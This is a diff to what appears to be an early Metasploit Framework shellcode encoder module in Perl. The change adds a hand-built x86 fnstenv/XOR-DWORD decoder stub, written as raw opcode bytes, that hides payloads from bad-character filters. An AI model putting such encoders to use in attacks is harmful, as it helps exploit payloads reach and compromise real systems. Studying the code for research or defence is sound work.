@@ -9,10 +9,9 @@
 
 package Msf::Encoder::PexFnstenvSub;
 use strict;
-use base 'Msf::Encoder';
+use base 'Msf::Encoder::XorDword';
 use Pex::Encoder;
 my $advanced = {
-  'PexDebug' => [0, 'Sets the Pex Debugging level (zero is no output)'],
 };
 
 my $info = {
@@ -30,11 +29,43 @@ sub new {
   return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
 }
 
-sub EncodePayload {
+# w00t http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0096.html
+# This is useful if you have a BadChar of say 0xff, and your payload is small (or insanely large)
+# enough to not have 0xff in your payload, which is realistic (<= 512 && > 4)
+sub _GenEncoder {
   my $self = shift;
-  my $rawshell = shift;
-  my $badChars = shift;
-  return(Pex::Encoder::Encode('x86', 'DWord Xor', 'Fnstenv Sub', $rawshell, $badChars, $self->GetLocal('PexDebug')));
+  my $xor = shift;
+  my $len = shift;
+  my $xorkey = pack('V', $xor);
+  my $l = Pex::Encoder::PackLength($len);
+
+  # spoon's smaller variable-length fnstenv encoder
+  my $decoder;
+  if($l->{'negSmall'}) {
+    # 24 bytes
+    $decoder =
+      "\xd9\xee".                         # fldz
+      "\xd9\x74\x24\xf4".                 # fnstenv [esp - 12]
+      "\x5b".                             # pop ebx
+      "\x31\xc9".                         # xor ecx,ecx
+      "\x83\xe9". $l->{'negLengthByte'} . # sub ecx, BYTE -xorlen
+      "\x81\x73\x18". $xorkey .           # xor_xor: xor DWORD [ebx + 24], xorkey
+      "\x83\xeb\xfc".                     # sub ebx,-4
+      "\xe2\xf4"                          # loop xor_xor
+  }
+  else {
+    # 27 bytes
+    $decoder =
+      "\xd9\xee".                         # fldz
+      "\xd9\x74\x24\xf4".                 # fnstenv [esp - 12]
+      "\x5b".                             # pop ebx
+      "\x31\xc9".                         # xor ecx,ecx
+      "\x81\xe9". $l->{'negLength'} .     # sub ecx, -xorlen
+      "\x81\x73\x1b". $xorkey .           # xor_xor: xor DWORD [ebx + 27], xorkey
+      "\x83\xeb\xfc".                     # sub ebx,-4
+      "\xe2\xf4"                          # loop xor_xor
+  }
+  return($decoder);
 }
 
 1;
